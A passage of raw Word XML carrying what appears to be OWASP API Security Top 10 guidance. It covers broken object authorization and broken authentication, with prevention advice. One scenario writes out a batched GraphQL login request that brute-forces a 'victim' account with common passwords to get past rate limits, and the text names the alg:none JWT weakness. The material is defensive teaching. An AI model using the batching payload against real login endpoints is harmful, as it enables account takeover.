          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>":"mutation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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deleteReports</w:t>
      </w:r>
      <w:proofErr w:type="spell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siteId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: ID!, $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>reportKeys</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: [String]!) {</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deleteReports</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>reportKeys</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>reportKeys</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</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0304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A"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0304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A"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Since the document with the given ID is deleted without any further permission checks, a user may be able to delete another user's document.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A"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80304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Implement a proper authorization mechanism that relies on the user policies and hierarchy.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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 the authorization mechanism to check if the logged-in user has access to perform the requested action on the record in every function that uses an input from the client to access a record in the database.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Prefer the use of random and unpredictable values as GUIDs for records' IDs.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0080304A" w:rsidRPr="00790A44" w:rsidRDefault="0080304A" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>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Write tests to evaluate the vulnerability of the authorization mechanism. Do not deploy changes that make the tests fail.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008423E3" w:rsidRPr="00790A44" w:rsidRDefault="008423E3" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="007142E6" w:rsidRPr="00790A44" w:rsidRDefault="007142E6"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API2:2023 Broken Authentication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913"/>
        <w:gridCol w:w="4308"/>
        <w:gridCol w:w="3899"/>
      </w:tblGrid>
      <w:tr w:rsidR="007142E6" w:rsidRPr="00790A44" w:rsidTr="007142E6">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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7142E6" w:rsidRPr="00790A44" w:rsidTr="007142E6">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Common</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Severe</w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t> : Business Specific</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007142E6" w:rsidRPr="00790A44" w:rsidTr="007142E6">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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The authentication mechanism is an easy target for attackers since it's exposed to everyone. Although more advanced technical skills may be required to exploit some authentication </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>issues, exploitation tools are generally available.</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Software and security engineers’ misconceptions regarding authentication boundaries and inherent implementation complexity make authentication issues prevalent. Methodologies of detecting broken </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>authentication are available and easy to create.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcMar>
              <w:top w:w="225" w:type="dxa"/>
              <w:left w:w="300" w:type="dxa"/>
              <w:bottom w:w="225" w:type="dxa"/>
              <w:right w:w="300" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="007142E6" w:rsidRPr="00790A44" w:rsidRDefault="007142E6"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Attackers can gain complete control of other users’ accounts in the system, read their personal data, and perform sensitive actions on their behalf. Systems are unlikely to be able to </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>distinguish attackers’ actions from legitimate user ones.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="007142E6" w:rsidRPr="00790A44" w:rsidRDefault="007142E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Authentication endpoints and flows are assets that need to be protected. Additionally, "Forgot password / reset password" should be treated the same way as authentication mechanisms.</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is vulnerable if it:</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Permits credential stuffing where the attacker uses brute force with a list of valid usernames and passwords.</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Permits attackers to perform a brute force attack on the same user account, without presenting captcha/account lockout mechanism.</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Permits weak passwords.</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Sends sensitive authentication details, such as </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>auth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tokens and passwords in the URL.</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Allows users to change their email address, current password, or do any other sensitive operations without asking for password confirmation.</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Doesn't validate the authenticity of tokens.</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Accepts unsigned/weakly signed JWT tokens (</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>{"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>alg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>":"none"}</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</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Doesn't validate the JWT expiration date.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007142E6" w:rsidRPr="00790A44" w:rsidRDefault="007142E6" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Uses plain text, non-encrypted, or weakly hashed passwords.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007142E6" w:rsidRPr="00790A44" w:rsidRDefault="007142E6" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>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Uses weak encryption keys.</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On top of that, a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>microservice</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> is vulnerable if:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007142E6" w:rsidRPr="00790A44" w:rsidRDefault="007142E6" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Other </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>microservices</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> can access it without authentication</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007142E6" w:rsidRPr="00790A44" w:rsidRDefault="007142E6" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>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Uses weak or predictable tokens to enforce authentication</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007142E6" w:rsidRPr="00790A44" w:rsidRDefault="007142E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7142E6" w:rsidRPr="00790A44" w:rsidRDefault="007142E6" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="384" w:after="154"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Scenario #1</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In order to perform user authentication the client has to issue an API request like the one below with the user credentials:</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lastRenderedPageBreak/>
        <w:t>POST /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>graphql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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roofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>query</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>":"mutation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> {</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roofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>login</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (username:\"&lt;username&gt;\",password:\"&lt;password&gt;\") {</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roofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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If credentials are valid, then an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>auth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> token is returned which should be provided in subsequent requests to identify the user. Login attempts are subject to restrictive rate limiting: only three requests are allowed per minute.</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To brute force log in with a victim's account, bad actors leverage </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>GraphQL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> query batching to bypass the request rate limiting, speeding up the attack:</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POST /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>graphql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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{"query":"</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mutation{</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>login(username:\"victim\",password:\"password\"){token}}"},</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{"query":"</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mutation{</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>login(username:\"victim\",password:\"123456\"){token}}"},</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{"query":"</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mutation{</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>login(username:\"victim\",password:\"qwerty\"){token}}"},</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{"query":"</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mutation{</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>login(username:\"victim\",password:\"123\"){token}}"},</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7142E6" w:rsidRPr="00790A44" w:rsidRDefault="007142E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Scenario #2</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In order to update the email address associated with a user's account, clients should issue an API request like the one below:</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PUT /account</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Authorization: Bearer &lt;token&gt;</w:t>
      </w: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p>
    <w:p w:rsidR="007142E6" w:rsidRPr="00790A44" w:rsidRDefault="007142E6" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>{ "</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>email": "&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>new_email_address</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;" }</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007142E6" w:rsidRPr="00790A44" w:rsidRDefault="007142E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Because the API does not require users to confirm their identity by providing their current password, bad actors able to put themselves in a position to steal the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>auth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> token might be able to take over the victim's account by starting the reset password workflow after updating the email address of the victim's account.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007142E6" w:rsidRPr="00790A44" w:rsidRDefault="007142E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Make sure you know all the possible flows to authenticate to the API (mobile/ web/deep links that implement one-click authentication/etc.). Ask your engineers what flows you missed.</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lastRenderedPageBreak/>
        <w:t>Read about your authentication mechanisms. Make sure you understand what and how they are used. OAuth is not authentication, and neither are API keys.</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Don't reinvent the wheel in authentication, token generation, or password storage. Use the standards.</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Credential recovery/forgot password endpoints should be treated as login endpoints in terms of brute force, rate limiting, and lockout protections.</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Require re-authentication for sensitive operations (e.g. changing the account owner email address/2FA phone number).</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 the </w:t>
      </w:r>
      <w:hyperlink r:id="rId20" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">OWASP Authentication </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Cheatsheet</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</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Where possible, implement multi-factor authentication.</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Implement anti-brute force mechanisms to mitigate credential stuffing, dictionary attacks, and brute force attacks on your authentication endpoints. This mechanism should be stricter than the regular rate limiting mechanisms on your APIs.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007142E6" w:rsidRPr="00790A44" w:rsidRDefault="007142E6" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Implement </w:t>
      </w:r>
      <w:hyperlink r:id="rId21" w:history="1">
        <w:r w:rsidRPr="00790A44">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>account lockout</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/captcha mechanisms to prevent brute force attacks against specific users. Implement weak-password checks.</w:t>
      </w:r>
